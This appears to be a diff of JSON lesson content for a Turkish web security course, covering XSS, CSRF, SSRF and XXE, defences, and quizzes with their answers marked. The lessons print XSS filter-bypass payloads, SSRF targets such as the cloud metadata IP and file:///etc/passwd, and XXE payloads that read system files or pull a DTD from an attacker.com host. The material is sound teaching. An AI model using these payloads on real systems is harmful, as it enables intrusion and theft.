+                    "content": "Gelişmiş XSS payload'ları ve güvenlik filtrelerini bypass etme teknikleri.\r\n\r\n🎯 **Advanced Payload'lar:**\r\n• **Polyglot Payload'lar:**\r\n  - <script>/*-/*/`/*\\`/*'/*\"/**/(/* */oNlY*/alert(1) )</script>\r\n\r\n• **Context-specific Payload'lar:**\r\n  - HTML: <img src=x onerror=alert('XSS')>\r\n  - JavaScript: ';alert('XSS');//\r\n  - CSS: {background:url('javascript:alert(1)')}\r\n  - URL: javascript:alert('XSS')\r\n\r\n🛡️ **WAF Bypass Teknikleri:**\r\n• **Comment Injection:**\r\n  - <script><!-- -->alert('XSS')<!-- --></script>\r\n  - <script>/* */alert('XSS')/* */</script>\r\n\r\n• **Line Break Variations:**\r\n  - <script>\\nalert('XSS')</script>\r\n  - <script>\\ralert('XSS')</script>\r\n  - <script>\\talert('XSS')</script>\r\n\r\n🔧 **CSP Bypass Teknikleri:**\r\n• **JSONP Endpoints:**\r\n  - <script src=\"https://api.example.com/jsonp?callback=alert\"></script>\r\n\r\n• **AngularJS Sandbox Escape:**\r\n  - {{constructor.constructor('alert(1)')()}}\r\n  - {{$eval.constructor('alert(1)')()}}\r\n\r\n⚠️ **Responsible Disclosure:**\r\n• **Güvenlik açığını bulduğunuzda:**\r\n  - Hemen saldırı yapmayın\r\n  - Sistem sahibine bildirin\r\n  - 90 gün bekleme süresi\r\n  - Detaylı rapor hazırlayın"
+                },
+                {
+                    "id": "8",
+                    "title": "Quiz: XSS (Cross-Site Scripting)",
+                    "type": "quiz",
+                    "question": "XSS saldırılarına karşı en etkili korunma yöntemi hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Input validation",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "Output encoding",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "C",
+                            "text": "WAF kullanımı",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Error handling",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "Output encoding XSS saldırılarına karşı en etkili korunma yöntemidir. Kullanıcı girdilerini güvenli bir şekilde encode ederek zararlı script'lerin çalışmasını önler."
+                }
+            ]
+        },
+        {
+            "id": "9_4",
+            "title": "CSRF ve Diğer Web Zafiyetleri",
+            "duration": "35",
+            "color": "#065f46",
+            "documents": 7,
+            "isCompleted": false,
+            "isActive": true,
+            "description": "CSRF, SSRF, XXE ve diğer web güvenlik açıklarını öğren, saldırı tekniklerini keşfet ve savunma stratejilerini geliştir.",
+            "pages": [
+                {
+                    "id": "1",
+                    "title": "CSRF (Cross-Site Request Forgery) Nedir?",
+                    "content": "CSRF, kullanıcının kimliğini kullanarak yetkisiz işlemler gerçekleştiren bir web güvenlik açığıdır.\r\n\r\n🎯 **CSRF Tanımı:**\r\n• Kullanıcının kimliğini kullanarak yetkisiz istekler\r\n• Kullanıcının bilgisi olmadan işlem yapma\r\n• Session hijacking'den farklı\r\n• OWASP Top 10'da A01 sırasında\r\n\r\n🔴 **CSRF Saldırı Senaryoları:**\r\n• **Para Transferi:**\r\n  - Banka hesabından para çekme\r\n  - Kredi kartı ile alışveriş\r\n  - Kripto para transferi\r\n\r\n• **Hesap Manipülasyonu:**\r\n  - E-posta adresi değiştirme\r\n  - Şifre değiştirme\r\n  - Profil bilgilerini güncelleme\r\n\r\n• **Veri Manipülasyonu:**\r\n  - Veri silme\r\n  - Veri ekleme\r\n  - Ayarları değiştirme\r\n\r\n⚠️ **CSRF Riskleri:**\r\n• Finansal kayıp\r\n• Veri kaybı\r\n• Hesap ele geçirilmesi\r\n• Yasal sorumluluklar\r\n• İtibar kaybı\r\n\r\n📊 **CSRF İstatistikleri:**\r\n• Web saldırılarının %8'i CSRF\r\n• Her 5 web sitesinden 1'inde CSRF açığı\r\n• Ortalama maliyet: 1.2 milyon dolar\r\n• %70'i otomatik araçlarla tespit ediliyor"
+                },
+                {
+                    "id": "2",
+                    "title": "SSRF (Server-Side Request Forgery)",
+                    "content": "SSRF, sunucunun kendi ağındaki veya dış ağlardaki kaynaklara istek göndermesini sağlayan bir güvenlik açığıdır.\r\n\r\n🌐 **SSRF Tanımı:**\r\n• Sunucunun istenmeyen kaynaklara istek göndermesi\r\n• Internal network erişimi\r\n• Cloud metadata abuse\r\n• OWASP Top 10'da A10 sırasında\r\n\r\n🎯 **SSRF Saldırı Hedefleri:**\r\n• **Internal Services:**\r\n  - Database servers\r\n  - Cache servers\r\n  - Management interfaces\r\n  - Internal APIs\r\n\r\n• **Cloud Metadata:**\r\n  - AWS metadata service\r\n  - Azure metadata service\r\n  - Google Cloud metadata\r\n  - Kubernetes API\r\n\r\n• **Localhost Services:**\r\n  - 127.0.0.1 services\r\n  - Local file system\r\n  - Internal applications\r\n  - Admin panels\r\n\r\n🔴 **SSRF Saldırı Teknikleri:**\r\n• **URL Manipulation:**\r\n  - http://127.0.0.1:3306\r\n  - http://169.254.169.254/\r\n  - http://localhost:8080/admin\r\n\r\n• **Protocol Schemes:**\r\n  - file:///etc/passwd\r\n  - gopher://internal-server:25\r\n  - dict://internal-server:11211\r\n\r\n• **IP Address Variations:**\r\n  - 127.0.0.1\r\n  - 0.0.0.0\r\n  - 2130706433 (decimal)\r\n  - 0x7f000001 (hex)\r\n\r\n⚠️ **SSRF Riskleri:**\r\n• Internal network keşfi\r\n• Sensitive data exposure\r\n• Service enumeration\r\n• Port scanning\r\n• Cloud credential theft"
+                },
+                {
+                    "id": "3",
+                    "title": "XXE (XML External Entity) Injection",
+                    "content": "XXE, XML işleme sırasında external entity'lerin kötüye kullanılmasıyla oluşan bir güvenlik açığıdır.\r\n\r\n📄 **XXE Tanımı:**\r\n• XML external entity'lerin kötüye kullanılması\r\n• Local file disclosure\r\n• Remote file inclusion\r\n• DoS attacks\r\n\r\n🎯 **XXE Saldırı Hedefleri:**\r\n• **Local File Disclosure:**\r\n  - /etc/passwd\r\n  - /etc/shadow\r\n  - Application config files\r\n  - Database credentials\r\n\r\n• **Remote File Inclusion:**\r\n  - External DTD files\r\n  - Malicious payloads\r\n  - Server-side request forgery\r\n\r\n• **Denial of Service:**\r\n  - Billion laughs attack\r\n  - XML bomb\r\n  - Resource exhaustion\r\n\r\n🔴 **XXE Payload Örnekleri:**\r\n• **Basic XXE:**\r\n  - <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>\r\n\r\n• **Blind XXE:**\r\n  - <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo></foo>\r\n\r\n• **Parameter Entity:**\r\n  - <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><foo></foo>\r\n\r\n• **DTD External:**\r\n  - <?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><foo></foo>\r\n\r\n⚠️ **XXE Riskleri:**\r\n• Sensitive file disclosure\r\n• Server-side request forgery\r\n• Denial of service\r\n• Information disclosure"
+                },
+                {
+                    "id": "4",
+                    "title": "Diğer Web Güvenlik Açıkları",
+                    "content": "Web uygulamalarında karşılaşılan diğer önemli güvenlik açıkları ve saldırı teknikleri.\r\n\r\n🔴 **File Upload Vulnerabilities:**\r\n• **Malicious File Upload:**\r\n  - PHP webshell upload\r\n  - Executable file upload\r\n  - Script file upload\r\n  - Image with embedded code\r\n\r\n• **Path Traversal:**\r\n  - Directory traversal\r\n  - File inclusion\r\n  - Arbitrary file read\r\n  - Configuration file access\r\n\r\n🔴 **Authentication Bypass:**\r\n• **Weak Authentication:**\r\n  - Default credentials\r\n  - Weak passwords\r\n  - No rate limiting\r\n  - Predictable tokens\r\n\r\n• **Session Management Issues:**\r\n  - Session fixation\r\n  - Session hijacking\r\n  - Insecure session storage\r\n  - Session timeout issues\r\n\r\n🔴 **Authorization Flaws:**\r\n• **Privilege Escalation:**\r\n  - Horizontal privilege escalation\r\n  - Vertical privilege escalation\r\n  - IDOR (Insecure Direct Object Reference)\r\n  - Function level access control\r\n\r\n🔴 **Information Disclosure:**\r\n• **Sensitive Data Exposure:**\r\n  - Database credentials\r\n  - API keys\r\n  - Personal information\r\n  - Business secrets\r\n\r\n• **Error Information:**\r\n  - Stack traces\r\n  - Database errors\r\n  - System information\r\n  - Debug information\r\n\r\n🔴 **Business Logic Flaws:**\r\n• **Price Manipulation:**\r\n  - Negative prices\r\n  - Quantity manipulation\r\n  - Discount abuse\r\n  - Coupon manipulation\r\n\r\n• **Race Conditions:**\r\n  - Time-of-check to time-of-use\r\n  - Concurrent operations\r\n  - Resource conflicts\r\n  - State inconsistency"
+                },
+                {
+                    "id": "5",
+                    "title": "Web Güvenlik Açığı Tespit Yöntemleri",
+                    "content": "Web güvenlik açıklarını tespit etmek için kullanılan yöntemler ve test araçları.\r\n\r\n🔍 **Manuel Test Yöntemleri:**\r\n• **Input Testing:**\r\n  - Parameter manipulation\r\n  - Header injection\r\n  - Cookie manipulation\r\n  - File upload testing\r\n\r\n• **Authentication Testing:**\r\n  - Login bypass attempts\r\n  - Session management testing\r\n  - Password policy testing\r\n  - Multi-factor authentication testing\r\n\r\n• **Authorization Testing:**\r\n  - Privilege escalation testing\r\n  - IDOR testing\r\n  - Function level access control\r\n  - Business logic testing\r\n\r\n🛠️ **Otomatik Test Araçları:**\r\n• **Burp Suite Professional:**\r\n  - Comprehensive web testing\r\n  - Advanced scanning\r\n  - Manual testing tools\r\n  - API testing\r\n\r\n• **OWASP ZAP:**\r\n  - Free web scanner\r\n  - Automated testing\r\n  - Manual testing support\r\n  - API testing\r\n\r\n• **Nessus:**\r\n  - Vulnerability scanner\r\n  - Network scanning\r\n  - Compliance checking\r\n  - Risk assessment\r\n\r\n• **Nuclei:**\r\n  - Fast vulnerability scanner\r\n  - Template-based\r\n  - Community templates\r\n  - Custom templates\r\n\r\n📋 **Test Süreci:**\r\n1. **Reconnaissance:** Uygulama keşfi\r\n2. **Mapping:** Attack surface mapping\r\n3. **Vulnerability Discovery:** Açık tespiti\r\n4. **Exploitation:** Açık sömürme\r\n5. **Impact Assessment:** Etki değerlendirmesi\r\n6. **Reporting:** Rapor hazırlama\r\n7. **Remediation:** Düzeltme önerileri"
+                },
+                {
+                    "id": "6",
+                    "title": "Web Güvenlik Açığı Koruması",
+                    "content": "Web güvenlik açıklarına karşı alınabilecek korunma yöntemleri ve güvenlik önlemleri.\r\n\r\n🛡️ **CSRF Koruması:**\r\n• **CSRF Tokens:**\r\n  - Unique token generation\r\n  - Token validation\r\n  - Token rotation\r\n  - Secure token storage\r\n\r\n• **SameSite Cookies:**\r\n  - Strict mode\r\n  - Lax mode\r\n  - None mode\r\n  - Cross-site request protection\r\n\r\n• **Referer Header Validation:**\r\n  - Origin checking\r\n  - Referer validation\r\n  - Header verification\r\n  - Fallback mechanisms\r\n\r\n🔒 **SSRF Koruması:**\r\n• **Input Validation:**\r\n  - URL whitelisting\r\n  - IP address validation\r\n  - Protocol restrictions\r\n  - Port restrictions\r\n\r\n• **Network Segmentation:**\r\n  - Internal network isolation\r\n  - Firewall rules\r\n  - Access controls\r\n  - Monitoring\r\n\r\n• **Cloud Security:**\r\n  - Metadata service protection\r\n  - IAM policies\r\n  - Network ACLs\r\n  - Security groups\r\n\r\n🔐 **XXE Koruması:**\r\n• **XML Parser Configuration:**\r\n  - Disable external entities\r\n  - Disable DTD processing\r\n  - Use secure parsers\r\n  - Input validation\r\n\r\n• **Input Sanitization:**\r\n  - XML validation\r\n  - Schema validation\r\n  - Content filtering\r\n  - Size limits\r\n\r\n⚡ **General Security Measures:**\r\n• **Input Validation:**\r\n  - Server-side validation\r\n  - Type checking\r\n  - Length limits\r\n  - Format validation\r\n\r\n• **Output Encoding:**\r\n  - Context-aware encoding\r\n  - HTML encoding\r\n  - JavaScript encoding\r\n  - URL encoding\r\n\r\n• **Authentication & Authorization:**\r\n  - Strong authentication\r\n  - Multi-factor authentication\r\n  - Proper authorization\r\n  - Session management\r\n\r\n• **Security Headers:**\r\n  - Content-Security-Policy\r\n  - X-Frame-Options\r\n  - X-Content-Type-Options\r\n  - Strict-Transport-Security"
+                },
+                {
+                    "id": "7",
+                    "title": "Quiz: CSRF ve Diğer Web Zafiyetleri",
+                    "type": "quiz",
+                    "question": "CSRF saldırılarına karşı en etkili korunma yöntemi hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Input validation",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "CSRF tokens",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "C",
+                            "text": "WAF kullanımı",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Error handling",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "CSRF tokens CSRF saldırılarına karşı en etkili korunma yöntemidir. Her istek için benzersiz token oluşturarak yetkisiz istekleri engeller."
+                }
+            ]
+        },
+        {
+            "id": "9_5",
+            "title": "Quiz: Web Güvenliği",
+            "duration": "20",
+            "color": "#064e3b",
+            "documents": 1,
+            "isCompleted": false,
+            "isActive": true,
+            "description": "Web güvenliği konusundaki bilgilerinizi test edin, kapsamlı quiz ile öğrendiklerinizi pekiştirin.",
+            "pages": [
+                {
+                    "id": "1",
+                    "title": "Quiz Girişi",
+                    "content": "Web Güvenliği kategorisinin kapsamlı quiz'ine hoş geldiniz! Bu quiz, tüm derslerde öğrendiğiniz konuları test edecek.\r\n\r\n📋 **Quiz Kuralları:**\r\n• 10 soru bulunmaktadır\r\n• Her soru için sadece bir doğru cevap vardır\r\n• %70 ve üzeri başarı gerekir\r\n• Quiz'i tamamladıktan sonra sonuçlarınızı görebilirsiniz\r\n\r\n🎯 **Quiz Konuları:**\r\n• Web güvenliği temelleri\r\n• OWASP Top 10\r\n• SQL Injection\r\n• XSS (Cross-Site Scripting)\r\n• CSRF ve diğer web zafiyetleri\r\n• Güvenlik testleri ve araçları\r\n• Korunma yöntemleri\r\n\r\n⚡ **Hazır mısınız?**\r\nQuiz'e başlamak için aşağıdaki soruları cevaplayın!"
+                },
+                {
+                    "id": "2",
+                    "title": "Soru 1: OWASP Top 10",
+                    "type": "quiz",
+                    "question": "OWASP Top 10 2021'de en kritik güvenlik açığı hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Injection",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "Security Misconfiguration",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "Broken Access Control",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "D",
+                            "text": "Cryptographic Failures",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "OWASP Top 10 2021'de en kritik güvenlik açığı A01:2021 - Broken Access Control'dur. Bu açık, kullanıcıların yetkilerini aşarak yetkisiz kaynaklara erişim sağlamasına neden olur."
+                },
+                {
+                    "id": "3",
+                    "title": "Soru 2: SQL Injection",
+                    "type": "quiz",
+                    "question": "SQL Injection saldırılarına karşı en etkili korunma yöntemi hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Prepared statements",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "B",
+                            "text": "Input validation",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "WAF kullanımı",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Error handling",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "Prepared statements (parametrized queries) SQL Injection saldırılarına karşı en etkili korunma yöntemidir. SQL kodunu veriden ayırarak injection saldırılarını önler."
+                },
+                {
+                    "id": "4",
+                    "title": "Soru 3: XSS Türleri",
+                    "type": "quiz",
+                    "question": "Hangi XSS türü en tehlikelidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Reflected XSS",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "DOM-based XSS",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "Blind XSS",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Stored XSS",
+                            "isCorrect": true
+                        }
+                    ],
+                    "explanation": "Stored XSS (Persistent XSS) en tehlikeli türdür çünkü zararlı kod veritabanında saklanır ve tüm kullanıcıları etkiler."
+                },
+                {
+                    "id": "5",
+                    "title": "Soru 4: XSS Koruması",
+                    "type": "quiz",
+                    "question": "XSS saldırılarına karşı en etkili korunma yöntemi hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Input validation",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "WAF kullanımı",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "Output encoding",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "D",
+                            "text": "Error handling",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "Output encoding XSS saldırılarına karşı en etkili korunma yöntemidir. Kullanıcı girdilerini güvenli bir şekilde encode ederek zararlı script'lerin çalışmasını önler."
+                },
+                {
+                    "id": "6",
+                    "title": "Soru 5: CSRF",
+                    "type": "quiz",
+                    "question": "CSRF saldırılarına karşı en etkili korunma yöntemi hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Input validation",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "WAF kullanımı",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "Error handling",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "CSRF tokens",
+                            "isCorrect": true
+                        }
+                    ],
+                    "explanation": "CSRF tokens CSRF saldırılarına karşı en etkili korunma yöntemidir. Her istek için benzersiz token oluşturarak yetkisiz istekleri engeller."
+                },
+                {
+                    "id": "7",
+                    "title": "Soru 6: SSRF",
+                    "type": "quiz",
+                    "question": "SSRF saldırılarının ana hedefi nedir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Internal network erişimi",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "B",
+                            "text": "Client-side kod çalıştırma",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "Database manipulation",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Session hijacking",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "SSRF saldırılarının ana hedefi internal network erişimidir. Sunucunun kendi ağındaki veya dış ağlardaki kaynaklara istek göndermesini sağlar."
+                },
+                {
+                    "id": "8",
+                    "title": "Soru 7: XXE",
+                    "type": "quiz",
+                    "question": "XXE saldırılarında en yaygın hedef nedir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Database credentials",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "Session hijacking",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "Local file disclosure",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "D",
+                            "text": "Password cracking",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "XXE saldırılarında en yaygın hedef local file disclosure'dır. /etc/passwd, /etc/shadow gibi sistem dosyalarını okumak için kullanılır."
+                },
+                {
+                    "id": "9",
+                    "title": "Soru 8: Web Güvenlik Testleri",
+                    "type": "quiz",
+                    "question": "Hangi test türü runtime'da çalışan uygulamayı test eder?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "SAST",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "SCA",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "Code Review",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "DAST",
+                            "isCorrect": true
+                        }
+                    ],
+                    "explanation": "DAST (Dynamic Application Security Testing) runtime'da çalışan uygulamayı test eder. Black box testing yöntemi kullanır."
+                },
+                {
+                    "id": "10",
+                    "title": "Soru 9: Güvenlik Headers",
+                    "type": "quiz",
+                    "question": "XSS saldırılarına karşı hangi güvenlik header'ı kullanılır?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "X-Frame-Options",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "Content-Security-Policy",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "C",
+                            "text": "X-Content-Type-Options",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Strict-Transport-Security",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "Content-Security-Policy (CSP) header'ı XSS saldırılarına karşı kullanılır. Hangi kaynaklardan script, style, image gibi içeriklerin yüklenebileceğini kontrol eder."
+                },
+                {
+                    "id": "11",
+                    "title": "Soru 10: Web Güvenlik Araçları",
+                    "type": "quiz",
+                    "question": "SQL Injection testleri için en popüler araç hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Burp Suite",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "Nmap",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "C",
+                            "text": "SQLMap",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "D",
+                            "text": "Nessus",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "SQLMap SQL Injection testleri için en popüler araçtır. Otomatik payload generation, multiple database support ve advanced evasion techniques sunar."
+                }
+            ]
+        }
+    ]
+}
